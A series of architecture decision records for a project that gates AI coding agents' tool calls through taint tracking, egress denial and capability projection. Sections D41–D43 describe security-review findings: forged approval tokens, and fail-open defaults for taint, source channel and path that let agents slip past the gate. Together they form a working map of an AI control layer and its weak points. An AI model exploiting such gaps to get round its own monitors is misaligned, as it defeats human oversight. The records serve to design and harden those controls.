## D29 — `trust_pins`: operator trust attestations pinned to content identity; taint becomes a recomputed cause-ledger
- **Epic:** E13.8 / E2 (taint) · extends D25 · **Status:** Accepted (live-hook interim shipped; canonical kernel field pending) · **See:** [`docs/trust-pins.md`](docs/trust-pins.md)
- **Decision:** Add **`trust_pins`** — operator attestations that a *specific read
  source is trusted*, each pinned to the source's **content identity** (`sha256` of
  the file bytes, or a reference repo's own `git_commit` + clean tree). At gate time
  a `Read` whose **live** content still matches a pin is classified **Trusted** and
  does **not** taint; any **drift** (bytes/commit change) or `expires` date revokes
  the pin and the read taints as normal. The per-session taint sidecar becomes a
  **ledger of causes**, and `tainted` is **recomputed every call** = *any recorded
  cause not covered by a valid pin*. Shipped in the live host hook: shared logic in
  `.claude/hooks/_gatelib.py` (used by both `world-gate.py` and `taint-notify.py`),
  `trust_pins` declared in `.claude/cc-world.json`. The **canonical home** is a
  `trust_pins` field in the real `WorldManifest` enforced by the pure `gate()`
  (kernel), to land with the D26 host cutover.
- **Why it is NOT a hole in invariant 6 (monotonic taint) or 7 (egress floor):** a
  pin re-classifies a source's trust **upstream of taint** — a pinned, content-
  verified read was *never* an untrusted-taint cause, so the recompute reflects
  *corrected provenance* (a human, design-time, auditable attestation), not a
  decrease of taint under fixed facts. The ledger **retains every cause** (audit),
  drift is **tamper-evident** (the descriptor-drift primitive from `safe-mcp-proxy`
  applied to reads), and the floor itself is untouched — an unpinned/tainted cause
  still `DENY`s egress. In the manifest's channel model it is exactly: a valid pin
  flips a read's `source_channel` from `workspace_files` (SemiTrusted, taint:true)
  to **Trusted (taint:false)**.
- **Binding correction (vs the initial "pin to HEAD" sketch):** bound to **content
  identity, not the harness repo's `HEAD`** — `repos/3p` is *not tracked in this
  repo* (`AGENTS.md`: never `git add repos/`), so this repo's HEAD says nothing about
  that content. Use the file's `sha256` (git-agnostic, per-file precise) or the
  **reference repo's own** HEAD commit + clean tree.
- **Resolves D25's deferred read-taint:** D25 option (a) was "tag an untrusted read
  with an untrusted `source_channel`"; `trust_pins` is the *exception* that re-tags a
  vouched read as Trusted. Implement the two together in the kernel port.
- **Alternatives:** (a) **delete the sidecar / reset taint** — rejected: unrecorded,
  blind re-taint, indistinguishable from a decrease-by-fiat; (b) **drop `repos/` from
  `taint_sources`** — rejected: blanket-trusts the whole tree *forever*, including
  future malicious edits, with no drift detection; (c) **drop `WebFetch` from
  `egress.tools`** — rejected: weakens invariant 7 itself; (d) **implement only in the
  kernel/manifest now** — the correct long-term home, but it does not govern the live
  session, so it cannot clear an in-flight tainted session (the operator's immediate
  need); recorded as the canonical follow-up; (e) **pin to the harness repo's HEAD** —
  rejected per the binding correction above.
- **Why ship the interim in the live hook:** the live `world-gate.py` is what governs
  this session; the pin/ledger is provable in isolation (`test-gate.sh` §4 + a
  throwaway-projdir simulation, both run green) and fails **open** on any helper/parse
  error, so it cannot brick a session. This mirrors the E13.2 "Python-first slice
  before the kernel ABI" pattern (D19→D24).
- **Known limits:** (1) the interim **grows the Python reimplementation D24 wants to
  retire** — accepted as interim; canonical logic is one `gate()` in the kernel.
  (2) a `sha256` pin is per-file; a `git_commit` pin trusts a whole clean tree at a
  commit (coarser, voided by any local edit). (3) editing the hook that governs *this*
  session is the **self-governance risk D26 flags** — done at operator direction, with
  fail-open preserved and out-of-band validation before reliance. (4) a pin is only as
  good as the operator's review of those bytes — it deliberately moves trust from *the
  model's runtime judgement* to *a human's design-time attestation*. That is the point.

## D30 — Rename the umbrella project `cli-agent` → `ai2rules`; "harness" stays the action layer
- **Status:** Accepted (rename) · refines/advances D23 · **See:** [`docs/THESIS.md`](docs/THESIS.md) §7
- **Decision:** Rename the repository / umbrella project from `cli-agent` ("CLI Agent
  Harness") to **`ai2rules`** — repo = site = thesis (the work already publishes at
  **ai2rules.dev**, and "AI → rules" *is* the stochastic→deterministic move). The old
  name had been outgrown: per **D23** the repo became the **umbrella over the five-layer
  thesis** (action · capability · knowledge · intent · substrate), not just the
  action-layer harness, so a name describing only the harness no longer fit. Scope of
  this change: GitHub repo renamed `sv-pro/cli-agent → sv-pro/ai2rules` (GitHub
  auto-redirects old URLs; local `gh` remote re-pointed); in-repo **identity + brand
  surfaces** (`README` title + an explicit "umbrella/companion for ai2rules.dev" note,
  `PLAN`/`DECISIONS`/`AGENTS` headers, `Cargo.toml` `repository`, blog `SITE_TITLE` /
  header / footer / about / index / DEPLOY, the `cli-harness` binary banner) → `ai2rules`.
  The **action-layer component keeps the name "harness"** (the kernel, the `cli-harness`
  binary, `docs/harness-architecture*.md`) because it is accurate and is *one* layer.
  **Crate names are unchanged** (`world-kernel`, `compiler`, `executor`, `cli-harness`,
  `harness-types`, …) — internal and still correct.
- **Why `ai2rules` over the alternatives:** chosen (by the maintainer) over
  `agentic-governance` (descriptive but generic / SEO-flat as a repo slug), `Worldgate`
  (a strong coined brand, but a new name to seed), and `IntentOS` (reads as a product and
  **D23** flagged it overweights the least-mature fragment). `ai2rules` reuses an
  already-owned domain, so repo = site = brand with zero new surface.
- **Alternatives:** keep `cli-agent` — rejected: it names only the action layer and
  actively misleads now that the repo is the umbrella; the three names above.
- **Deferred (the open companions, still from D23 §7.3 / THESIS §7):** (1) the **GitLab**
  mirror rename (`origin`) — done via its web UI, not scripted (a `curl` to the GitLab API
  is itself denied by our taint floor while the session is tainted — a fitting dogfood);
  (2) the **local working-dir** rename `cli-agent/ → ai2rules/` — deferred (renaming the
  CWD mid-session breaks paths/hooks); (3) the **physical consolidation** of the sibling
  repos into one tree (meta-repo with submodules vs. a single Cargo/workspace) — the
  umbrella *form* remains the genuinely open decision, to be recorded when taken.
- **Known limits:** published blog-post *prose* and the `harness-architecture*.md` titles
  still say "CLI Agent Harness" — kept deliberately (they describe the action-layer harness
  / are historical published content); a prose-rebrand pass is optional follow-up. The
  GitLab repo stays named `cli-agent` until renamed in its UI.

## D31 — Ship as infrastructure (plugin/sidecar), not a standalone agent; lead with the Claude Code Governance Pack

**Date:** 2026-06-27.

- **Decision:** ai2rules is delivered as a governance **engine that always wraps a host
  the user already runs** — never as our own standalone agent/CLI product. The model is
  **OPA / seccomp / Envoy for agent actions**: standalone *in form* (its own crate /
  binary / hook set), plugin *in role* (zero value alone; it governs another system).
  One kernel is projected onto several surfaces — a **Claude Code Governance Pack**
  (hooks plugin, the **lead / v1**), a **Safe MCP Proxy** (sidecar), the **`harness gate`
  binary** + **`world-kernel` crate** (sidecar / library for embedders). User segments,
  packages, and "install → get" walkthroughs live in [`docs/USE-CASES.md`](docs/USE-CASES.md).
- **Cut:** the earlier "custom CLI agent on a Claude Code basis" ambition is retired **as
  a product**. The `cli-harness` CLI and the E9 TUI remain a dev / demo / reference
  harness, not the shipped artifact.
- **Why:** the moat is the *border*, not the agent. Shipping our own agent (a) contradicts
  the host-neutral thesis (D24: the gate ABI exists precisely to sit *under* hosts),
  (b) forces competition on our weakest surface — model + host UX, vs. Anthropic / OpenAI
  / Hermes — while diluting the only differentiator (governance), and (c) the plugin form
  rides existing distribution (Claude Code's users, the MCP ecosystem) and is *already
  built and dogfooded*. Adoption path: free individual wedge (the Pack) → team/org
  policy-as-code + audit/replay (the **OPA-for-agents** revenue story) → embedders.
- **Alternatives (rejected):**
  - *Standalone governed agent* — biggest surface, weakest differentiation, contradicts
    host-neutrality.
  - *MCP-proxy-only* (the old Safe-MCP scope) — too narrow as the *lead*: an MCP proxy
    can't see a host's **native** tools (`Bash`/`Edit`/`Write`/`Read`/`WebFetch`), the
    highest-leverage governance gap; it ships as surface #2, not #1.
  - *Library-only* — too high-friction for the adoption wedge; ships as surface #3 for
    embedders.
- **Consequence for the plan:** `PLAN.md` gains a "Delivery model & packaging" section
  sequencing existing epics as products (CC Pack first); supporting layers (knowledge /
  intent / substrate) ship later as optional sidecars behind spine contracts, never as a
  v1 prerequisite.
- **Related:** D24 (host-neutral gate ABI), D30 (umbrella rename), `docs/THESIS.md` §4/§7,
  `docs/RESEARCH-BACKLOG.md` R1 (the cross-host super-harness is a *later* surface of this
  same engine, not v1).

## D32 — Govern GitHub Copilot (and JetBrains) via the MCP surface, not a native hook; lead artifact = a shaped JIRA-MCP capability surface

**Date:** 2026-06-28.

- **Context:** goal is an **internal demo at the maintainer's workplace** on the hosts
  colleagues actually use — most on **GitHub Copilot** (JetBrains for backend devs, VS Code
  for frontend), a few on **Claude Code**.
- **Decision:** govern Copilot (VS Code + JetBrains) and Claude Code for the demo through
  the **MCP surface** via the **Safe MCP Proxy** — capability projection (**ABSENT**),
  scoped-capability **arg-locking**, descriptor-drift, audit. One proxy fronts the
  **Atlassian Remote MCP Server**; **one manifest governs all three hosts**. Lead artifact:
  *give Copilot scoped JIRA access (read + comment on a specific project), every destructive
  JIRA tool ABSENT* — "I can give Copilot JIRA access and not worry about an accidental
  destructive action."
- **Why:** Copilot exposes **no stable third-party per-call gate** over its native tools
  (unlike Claude Code's `PreToolUse`); the **MCP surface is exactly where Copilot *is*
  governable**, and it's **host-agnostic** (the same proxy config serves VS Code, JetBrains,
  and Claude Code). It also plays to our strongest primitive — capability projection /
  ABSENT (D27) — and needs nothing from a vendor roadmap.
- **Reuse (big de-risk):** `repos/safe-mcp-proxy` already ships an **Atlassian passthrough**
  (`atlassian/`: `passthrough.py`, `ManifestPolicyEngine` with `arg_rules`/data-flow,
  `CapabilityFilter`), an **MCP server mode** (`mcp_server --upstream …`),
  `manifests/atlassian_mvp.yaml` (real Atlassian MCP tool names; destructive tools already
  ABSENT; `project_key` arg-locked), an Atlassian demo, and an audit dashboard. So the demo
  is **wire + author-manifest + validate-against-real-JIRA**, not build.
- **Accepted split:** use the **existing Python `safe-mcp-proxy`** for the demo now;
  **Rust productization** of the proxy through the real kernel / gate ABI (**E13.4**) is a
  follow-up, not a demo blocker. (Note: `safe-mcp-proxy` is a reference repo under `repos/`
  — never `git add`ed; the demo's own artifacts — manifest, host configs, runbook — live in
  this repo under `docs/demos/`.)
- **Alternatives (rejected):**
  - *A VS Code / JetBrains extension intercepting Copilot's native file/terminal tools* —
    per-host, fragile, no stable public gate API, deep effort; deferred (a possible later
    surface, not for this demo).
  - *Wait for a Copilot-native governance hook* — not available; won't gate the demo on a
    vendor.
  - *Sandbox / egress-floor only (E8 / D21)* — strong for the exfil story but doesn't
    deliver the **shaped capability surface** the audience asked for; kept as the substrate
    complement, not the lead.
- **Consequence:** `PLAN.md` gains **E16** as the **top near-term priority**, ahead of the
  longer-tail epics.
- **Related:** D24 (gate ABI), D27 (ABSENT vs policy middleware), D31 (delivery model — this
  brings the "Safe MCP Proxy" surface forward), E7 / E13.4, `repos/safe-mcp-proxy`,
  `repos/mcp-tool-projection`.

## D33 — Pivot: one Rust binary, lead with the *governability gap* (not the least-governable host)

**Date:** 2026-06-28. **Supersedes the demo *mechanics* of D32** (keeps D32's finding that
Copilot is governable only at the MCP surface).

- **Context:** the maintainer disliked the D32 setup — a two-repo split, three runtimes
  (Rust kernel + Python proxy + Node `mcp-remote`), the demo running a *parallel* Python
  engine instead of the real kernel, and "aligning down" to the least-governable host.
- **Decision:** build the internal demo **Rust-only, inside `ai2rules`** (no second repo, no
  Python, no Node in the core), running the **real `world-kernel`** via the gate ABI. Three
  pieces, one `harness` binary:
  - **Claude Code = deep:** its `PreToolUse` hook calls the Rust **`harness gate`** binary
    (retiring the Python hooks for the demo) — governs **native tools + MCP** (taint floor,
    ABSENT, ASK).
  - **Copilot = shallow:** a new **`harness mcp-gateway`** (world-kernel in-process) governs
    the **MCP tool surface only** — the only place Copilot is governable.
  - **`harness mock-jira`:** a self-contained Rust MCP upstream (jira_* tools incl.
    destructive), so the demo runs anywhere with **no creds / Node / Python**. Real
    Atlassian is a later *skin* (would add `mcp-remote` or a Rust SSE client).
- **The demo's payload is the gap, not the tool.** Same intent on both hosts; CC covers
  native+MCP, Copilot covers MCP-only; the uncovered native action on Copilot is the
  awareness point. Output artifact: a **host governability scorecard** (also blog fuel) —
  "platforms aren't equal in *governability*, not just features."
- **Why:** collapses the two-repo + three-runtime sprawl into **one Rust binary**, makes the
  demo run the **actual moat** (the kernel, not a parallel engine), and reframes around a
  more original, thesis-aligned message. The Python `mcp_gateway` (safe-mcp-proxy
  `feat/mcp-gateway`) stays as the throwaway prototype that proved the shape.
- **Alternatives rejected:** keep the Python proxy (two repos, parallel engine, drift);
  Copilot-only / align-down (hides the real story); a Node bridge for real Atlassian in v1
  (reintroduces a runtime — deferred to the real-JIRA skin).
- **Related:** D24 (gate ABI), D31, **D32** (the finding this keeps), E16 (re-cut), **E13.4**
  (this *is* the Rust MCP projection shim, brought forward).

## D34 — In-tree Rust hosts link `gate()`; the `harness gate` wire ABI serves out-of-process / non-Rust hosts

**Date:** 2026-06-29. **Refines D33's mechanism** (which said the CC hook would shell to the
`harness gate` *binary*).

- **Context:** building E16.C, the natural shape was `harness cc-hook` — a `PreToolUse`
  adapter that, being Rust *inside this workspace*, can call `harness_preview::gate()`
  **directly**. The same is already true of `harness mcp-gateway` (E16.B). D33's wording
  ("the hook calls the `harness gate` binary") implied a subprocess per call.
- **Decision:** an agent host that is **Rust and in-tree links `gate()` in-process**
  (`cc-hook`, `mcp-gateway`). The **`harness gate` subprocess (D24 wire ABI)** is for hosts
  that are **out-of-process or non-Rust** (a Python/Node adapter, a different repo, an IDE
  plugin) — they marshal `GateRequest`/`GateResponse` JSON over stdio. Both paths call the
  *same* pure function, so verdicts are identical by construction.
- **Why:** a `PreToolUse` hook fires on **every** tool call; spawning a process + recompiling
  the world per call is needless overhead, and the value of D24 (no *reimplementation* of the
  kernel) is preserved either way — in-process is the same `gate()`, not a parallel engine.
  The wire ABI keeps its real job: a language/process boundary, not a Rust↔Rust one.
- **Alternatives rejected:** force `cc-hook` to shell to `harness gate` (two extra processes
  + double JSON marshalling per native tool call, for no isolation benefit between two halves
  of the same binary); drop the wire ABI entirely (breaks non-Rust hosts — D24's whole point).
- **Related:** **D24** (the wire ABI this scopes), **D33** (the mechanism this refines), E16.B/E16.C.

## D35 — OpenCode target uses plugin `tool.execute.before` + host permissions, not a forked policy engine

**Date:** 2026-06-30. **Extends:** D24 / D34 to a non-Rust host adapter.

- **Context:** OpenCode exposes two useful control planes: config-level `permission` rules
  (`allow` / `ask` / `deny`) and TypeScript/JavaScript plugins with a `tool.execute.before`
  hook that can inspect/mutate tool arguments or throw to block execution. This is close enough
  to Claude Code's `PreToolUse` to govern native tools, but it is not the same structured hook
  protocol: there is no documented `permissionDecision: allow|deny|ask` return value from the
  plugin hook itself.
- **Decision:** add OpenCode as a planned host target (**E17**) through a thin
  `.opencode/plugins/` adapter. The first slice calls the existing **`harness gate` wire ABI**
  as an out-of-process/non-Rust host (per D34), persists monotonic taint in an OpenCode sidecar,
  lets `ALLOW` continue, and blocks `DENY` / `ABSENT` / `REPLAN` by throwing. `ASK` is delegated
  to OpenCode's `permission` layer where possible, and otherwise surfaced as an explicit block
  until a cleaner approval UX is proven. The plugin must not reimplement taint, policy, or
  descriptor logic.
- **Why:** this keeps the architecture's one-kernel rule intact while expanding beyond Claude
  Code. It also enriches the E16 governability-gap story with a third native-tool host class:
  Claude Code has structured hook decisions; OpenCode has a powerful pre-execute plugin seam
  plus permissions; Copilot/JetBrains remain MCP-only for now.
- **Alternatives rejected:** fork OpenCode or embed governance inside its source tree (too heavy,
  host-specific, and not a plugin product); write a standalone JS policy engine in the plugin
  (guaranteed drift from `world-kernel`); rely only on OpenCode `permission` patterns (useful
  defense-in-depth, but cannot express the compiled-world / taint / replay model); make WASM the
  first slice (interesting later, but subprocess `harness gate` is simpler and is already the
  conformance ABI for non-Rust hosts).
- **Related:** **D24** (gate ABI), **D34** (non-Rust hosts use the wire ABI), **E17**
  (OpenCode Governance Pack), **E16** (host governability scorecard).

## D36 — Command classification is manifest/world data, not adapter code

**Date:** 2026-07-12. **Extends D25** (which placed classification in the adapter).

- **Context:** D25 let each host adapter classify `Bash` by command shape into
  `Bash`/`Bash_network`/`Bash_destructive`. By E17 the same pattern lists + word-boundary
  matcher existed **three times** — Rust (`cc_hook.rs`), TypeScript (`ai2rules-gate.ts`),
  Python (`world-gate.py`) — the exact reimplementation-drift class D24 exists to end
  (one had already drifted once: the word-boundary fix had to be ported to all copies).
- **Decision:** classification is **world data**. The manifest gains `command_classes`
  (`action` + `arg` (default `command`) + ordered `classes: [{to, patterns}]`), compiled
  into `CompiledWorld`; `gate()` resolves the **effective action** first
  (`classify_command`: first class whose any pattern matches at a left word boundary) and
  returns it as the new `GateResponse.action` field (a backward-compatible v1 addition,
  used in the approval token and the adapters' taint-cause notes). Adapters send the
  **raw host tool name**. `skip_serializing_if` keeps pre-D36 manifest hashes stable;
  `validate()` rejects classifiers naming undeclared actions or empty patterns. The D25
  golden vectors moved into `harness-preview` gate tests; a conformance test pins the
  pattern lists byte-identical across the three host manifests.
- **Alternatives rejected:** (a) **per-adapter regex copies** (status quo) — three
  drifting engines; (b) **a generated shared list** (codegen from one source into each
  language) — sync tooling for what is simply *data the kernel already compiles*;
  (c) **host-specific exceptions** (let a host override classes locally) — reintroduces
  per-host policy, the thing adapters must never own.
- **Why this does not violate "no shell parsing in the kernel" (D25 alt (a)):** the
  kernel still parses nothing — it substring-matches operator-declared patterns from the
  compiled world, the same class of data-driven check as `arg_constraints`. What a
  command *is* remains manifest-declared (design-time, auditable), not adapter-coded.
- **Related:** D24, D25, D34, `docs/one-kernel-many-hosts.md`, `tests/one_kernel.rs`.

## D37 — Claude Code live-hook cutover to `harness cc-hook` via in-place bootstrap shims

**Date:** 2026-07-12. **Executes the cutover D26 deferred**; supersedes the live Python
engine (E13.2/D29 interim).

- **Decision:** the live host's PreToolUse governance now runs the **real Rust kernel**:
  `settings.json` points at `.claude/hooks/world-gate.sh`, a bootstrap shim (now hardened by
  D46 to locate `harness` only from an explicit absolute override or installer-owned absolute
  path; fail-open exit 0 if absent; else `exec harness cc-hook --world .claude/cc-world.yaml
  --state .claude/state`). `world-gate.py` was **replaced in content, in place**, with the same
  shim in Python. The Python engine (`world-gate.py` original, `_gatelib.py`,
  `world-gate-adapter.py`, `cc-world.json`, its tests and demos) is archived under
  `.claude/hooks/superseded/` with a README. `taint-notify.py` stays (observability, not
  policy; degrades gracefully without `_gatelib`).
- **The in-place-shim rule:** hook configs may be **snapshotted at session start** — if
  the configured hook *file* disappears mid-session, `python3` exits 2 and every
  subsequent tool call is blocked, unrecoverably (a session was lost exactly this way:
  `git mv world-gate.py superseded/` before editing `settings.json`). Therefore a live
  hook file is never moved or deleted; it is emptied into a shim, and only *new* wiring
  changes paths.
- **What the cutover consciously drops** (recorded, not hidden): **trust pins (D29)** —
  no typed `trust_pins` field exists in the compiled `WorldManifest` yet, so operator
  attestations are not honored until it lands; **path-based read-taint** — reading
  `repos/` no longer taints (taint enters via Network/External/Memory outputs, the v1
  gate policy); the archived `demo-injection-egress.sh` depended on it.
- **Alternatives rejected:** keep the Python engine as the live gate (two sources of
  truth — the state D24/D33 exist to end); cut over by moving files + editing
  `settings.json` (the session-bricking trap above); wait for trust-pins/path-taint
  parity first (indefinite delay for features the kernel will gain as typed manifest
  fields — D26 already validated the adapter path).
- **Related:** D24, D26, D29 (open follow-up), D34, D36, `docs/one-kernel-many-hosts.md`,
  `.claude/hooks/superseded/README.md`.

## D38 — The March-2026 runtime cluster is superseded; record the lineage

**Date:** 2026-07-17.

- **Context:** In March 2026 the border ideas were first stated as four separate `sv-pro`
  repos, all dormant since late March: `safe-agent-runtime-core` (deterministic policy kernel +
  IRBuilder + taint, 43 commits, Mar 18–22), `safe-agent-runtime-pro` (typed models / capability
  DSL / presets, 21 commits), `agent-world-compiler` (workflow → world manifest → capability
  surface, 26 commits), `agent-world-compiler-poc` (least-privilege-from-observed-execution PoC,
  30 commits). `docs/THESIS.md` §5 credits only `agent-hypervisor` and `safe-mcp-proxy` as
  primitive sources and is silent on these four — the single biggest "which repo is real?"
  ambiguity in the cluster. Silence is not a decision; this entry makes it one.
- **Decision:** Declare the March cluster **superseded**, and record where each idea now lives:
  - `safe-agent-runtime-core` (kernel, IRBuilder, taint/provenance) → **`crates/world-kernel`**.
    The lineage is concrete: `-core`'s final commits added the "Safe MCP Proxy / Agent Runtime
    Firewall" positioning that `safe-mcp-proxy` carried forward a month later (→ `ABSENT ≠ DENY`,
    §5).
  - `agent-world-compiler` (workflow → manifest compiler) → **`crates/compiler`**.
  - `safe-agent-runtime-pro` (typed models / capability DSL / presets) → the manifest schema
    across **`crates/compiler` + `crates/harness-types`**.
  - `agent-world-compiler-poc` → **spent**; its PoC role is fulfilled by `crates/compiler`.
  - Capability projection as a *concept* now lives in
    `agentic-execution-governance/mcp-tool-projection` (a §5 primitive source) and
    `cedar-world-playground`, not in the dead compiler.
  - **Archive** all four on GitHub with a one-line README pointer here. Archive, not delete —
    the provenance trail is what makes this supersession auditable.
- **Not superseded by this entry:** `sv-pro/agent-harness` is a **model-eval fixture**
  (`HARD_TASK.md`, hard-opus vs hard-fable), not part of this lineage — keep it; retitle its
  README so it stops reading as a product. It is distinct from the third-party
  `agent-harness-generator`/MetaHarness rejected in D24, and from the separate 1-commit
  `agentic-execution-governance/agent-harness` placeholder (a name collision resolved elsewhere).
- **Why:** converts §5's silence into an explicit decision and closes the largest source of
  cluster ambiguity, while preserving lineage.
- **Alternatives rejected:** keep them as separate active repos (N drifting statements of one
  thesis, none authoritative — the fragmentation D23 exists to end); delete them (loses the
  lineage record).
- **Related:** D23 (unify under one thesis), D30 (rename to `ai2rules`), **D39** (umbrella form),
  §5 / §7.3.

## D39 — Umbrella form (resolves §7.3): federated org-per-layer under one master thesis

**Date:** 2026-07-17. **Resolves** the umbrella-form decision deferred in `docs/THESIS.md` §7.3
and `PLAN.md`.

- **Context:** §7.3 left three options open — (a) meta-repo with submodules, (b) docs-only
  umbrella site, (c) Cargo/workspace consolidation — and `PLAN.md` deferred the choice "until the
  context-engine demo reveals the natural structure." As of 2026-07-17 the cluster is *already*
  split across GitHub orgs by thesis layer: **`agentic-execution-governance`** (action +
  capability: `mcp-tool-projection`, `cedar-world-playground`), **`Intent-Hub`** (intent +
  knowledge: `intentos-core`, `intentos-specs`, `intent-workbench`), and **`sv-pro`** (the
  `ai2rules` action flagship + everything else). Two documents each claim source-of-truth status:
  this repo's `docs/THESIS.md` (the border) and `Intent-Hub/intentos-specs` ("the single source
  of truth" for the intent layer). That is the `semlens` spec-drift failure mode, one level up.
- **Decision:** Adopt a **federated** umbrella — org-per-layer, unified by one master thesis:
  - **`docs/THESIS.md` (this repo) is the single master thesis** for the whole program (the
    border + five layers). There is exactly one.
  - Each layer keeps its own org and may keep its own specs (e.g. `Intent-Hub/intentos-specs`),
    but **those specs point *up* to the master thesis and never restate it** — the same anti-drift
    rule the control-room workspace follows. Layer specs govern implementation detail *within* a
    layer; the thesis governs what the layers are and why.
  - **No forced consolidation into a single repo.** Crates remain the unit of modularity *within*
    a repo; orgs remain the unit *across* layers.
- **Why:** it matches the structure already built instead of fighting it; it kills the two-SSOT
  drift by subordinating every layer spec to one thesis; migration cost is ~zero. It rejects
  "one repo" specifically because the evidence for it (10 crates already work) argues for
  crate-granularity *within* a repo, not for collapsing three orgs into one.
- **Alternatives rejected:**
  - (c) single consolidated repo — absorb the org repos as crates, archive the orgs: real
    migration cost, and it fights a deliberate org structure; the crate evidence supports
    intra-repo granularity, not cross-layer collapse.
  - fully independent projects with co-equal SSOTs — exactly the drift this entry prevents.
  - keep deferring — the deferral itself was the management cost that prompted this.
- **Follow-ups (non-blocking):** open `intentos-specs` with a pointer to the master thesis; add a
  "layers & homes" table to §7 listing each org; resolve the `agent-harness` name collision (D38).
- **Related:** D23, D30, **D38**, §7.3, `PLAN.md` "Next step".

## D40 — Repository topology: one live implementation, the rest archived reference (completes §7.3 / D39)

**Date:** 2026-07-18. **Completes** the umbrella-form decision: D39 settled umbrella
*ownership* (one master thesis); this entry settles umbrella *form*.

- **Context:** D39 adopted a federated org-per-layer umbrella and rejected "one repo" — but read
  narrowly that leaves the cluster a permanent constellation of live repos across three orgs, which
  is the management cost that started this whole exercise. Revisiting with the owner: the goal is
  not permanent federation but a **single live implementation**, with the federation as inherited
  state to consolidate. `ai2rules` already holds the entire action layer as crates and is the only
  repo with a real status (M1–M3 done, 152 tests). The intent layer (`Intent-Hub`) is the one
  still-live sibling — and its action/intent split is the two complementing sides of the *same*
  stochastic–deterministic border, so it belongs *inside* `ai2rules`, not beside it.
- **Decision:** Resolve the cluster to a **four-role topology**:
  1. **One live public implementation — `ai2rules`.** All core logic, demos, tests. The sole repo
     under active development.
  2. **One private meta / workspace — `agentic-execution-governance`** (the control room). Governs
     the cluster, owns publishing drafts, never restates the thesis.
  3. **Publishing rides on `ai2rules`** (ai2rules.dev + `blog/`); drafts stage in the meta repo and
     publish from the flagship. No dedicated publishing repo.
  4. **Everything else → archived, read-only reference**, each with a one-line README pointer here.
- **Intent layer folds in over time.** `Intent-Hub` (`intentos-core`, `intentos-specs`,
  `intent-workbench`, `intent-os`) is **not archived**; its live work migrates into `ai2rules` as
  crates, and only then do those repos archive. Until migrated, `Intent-Hub` stays live and
  `intentos-specs` keeps pointing up to the master thesis (D39).
- **First archive batch (2026-07-18):** the D38 March cluster (`safe-agent-runtime-core`, `-pro`,
  `agent-world-compiler`, `agent-world-compiler-poc`); `safe-mcp-proxy` (§5 reference, frozen but
  readable so §5 citations resolve); and the superseded intent predecessors (`intent-memory-engine`,
  `intent_core`, `ai-aikido-gateway`). Eight repos.
- **Held back this round (owner's call):** `agent-hypervisor` — the origin repo and the cluster's
  only external traction (7★); it is frozen *later*, not now. `context-engine` stays
  **live-dormant** (load-bearing for the next step). `agent-harness` (sv-pro) stays a model-eval
  fixture (retitled, D38). The capability org repos (`mcp-tool-projection`, `cedar-world-playground`)
  and the adjacent set (`semlens`, `manifest`, `claude-mem`, `mcp-workspace-gateway`,
  `cli-mcp-adapter`) are deferred sub-calls, not swept in.
- **Why:** it delivers what D39 could not — one answer to "which repo is real?" — while keeping
  every superseded repo auditable (archive, not delete). It **refines rather than reverses D39**:
  the single master thesis and the "point up, never restate" anti-drift rule both stand; what changes
  is that federation becomes a *migration path* to consolidation, not the endpoint.
- **Alternatives rejected:** keep the federation permanently (D39 read narrowly) — leaves N live
  repos and the management cost intact; delete the superseded repos — loses the lineage D38 exists
  to preserve; archive `Intent-Hub` now — discards live intent work and the other half of the border.
- **Related:** D23, D30, **D38** (the March cluster this batch archives), **D39** (umbrella
  ownership this completes), §7.3.

## D41 — Pure gate approval tokens are correlation ids, not grants

**Date:** 2026-07-23.

- **Context:** A security review found that the host-neutral `harness gate` ABI treated any
  non-empty `context.approval_token` in a `GateRequest` as `EvalContext.approval_granted = true`.
  The gate is deliberately pure and has no approval-store lookup, verifier callback, or trusted
  host identity. That made a request-controlled correlation field equivalent to a bearer grant for
  every approval-required action.
- **Decision:** Keep the v1 `context.approval_token` field for wire compatibility and keep returning
  an `approval.token` on `ASK`, but define both as correlation ids only. The pure gate ignores
  request-supplied approval tokens and never maps them to `approval_granted`. A trusted runtime
  that supports approval resumption must validate a durable approval-store binding outside the gate
  (action, params, world, descriptor, provenance, and effect mode) before setting
  `EvalContext.approval_granted` at its own kernel boundary.
- **Why:** This preserves the pure native/WASM/conformance gate contract while closing the forged
  approval-token path. Without a verifier, the only safe default is to fail closed and return `ASK`.
- **Alternatives rejected:** remove the field outright (unnecessary v1 wire break); add store I/O or
  a verifier callback to `harness-preview::gate` (breaks the pure shared gate used by native and
  WASM); continue treating the token as a grant (request-controlled approval bypass).
- **Related:** D24 (host-neutral gate ABI), D34 (in-process vs wire), D37 (live-hook cutover),
  E6 approval binding model.

## D42 — Gate context fields are explicit fail-closed inputs

**Date:** 2026-07-23.

- **Context:** A security review found three fail-open defaults at the host-neutral gate boundary:
  missing or malformed `context.taint` became clean, missing or malformed
  `context.source_channel` became trusted user input, and roots-enabled file actions with no
  adapter-resolved `path` skipped spatial scope. These were intended as adapter conveniences, but
  they made thin or drifted adapters silently drop the controls that make the gate meaningful.
- **Decision:** Keep the v1 wire fields, but make them explicit security inputs:
  `context.taint` must be `clean` or `tainted`; `context.source_channel` must be one of the
  recognized source aliases; and when roots are enabled, path-scoped file actions must carry the
  adapter-resolved absolute `path`. Missing or malformed context returns an evaluated `DENY` with a
  specific rule (`missing_taint`, `invalid_taint`, `missing_source_channel`,
  `invalid_source_channel`, or `missing_path`). Non-file actions such as Bash remain path-exempt.
- **Why:** The pure gate cannot reconstruct omitted host context safely. Failing closed at the ABI
  boundary preserves the one-kernel model while forcing adapters to prove what they know instead of
  receiving trusted defaults.
- **Alternatives rejected:** continue defaulting to clean/user-prompt/no-path (the reviewed
  bypass); make malformed requests process errors (would push fail-open/fail-closed policy back
  into each adapter); require paths for every `Read` action (breaks non-filesystem reads such as MCP
  queries in worlds that also use roots).
- **Related:** D24 (host-neutral gate ABI), D36 (kernel-side classification), D37 (live-hook
  cutover), D41 (approval tokens are not grants), roots path-scope hardening.

## D43 — Source-channel trust is compiled manifest policy

**Date:** 2026-07-23.

- **Context:** A security review found that `harness gate` accepted explicit
  `context.source_channel`, but then mapped it through hard-coded `SourceChannel` enum defaults.
  That meant a manifest row such as `workspace_files: Untrusted, taint:true` could be silently
  upgraded to the enum's legacy workspace-file trust, allowing actions the manifest's capability
  matrix intended to hide.
- **Decision:** Compile `channels:` into `CompiledWorld` as the runtime source-channel policy.
  Gate requests resolve their wire `source_channel` through that compiled table; the resulting
  manifest trust drives capability checks, and the manifest channel taint is joined into the
  carried taint before the kernel decides. Unknown channel names and duplicate aliases are rejected
  at manifest validation; undeclared runtime channels fail closed as `invalid_source_channel`.
  Manifests with no `channels:` keep legacy defaults for compatibility.
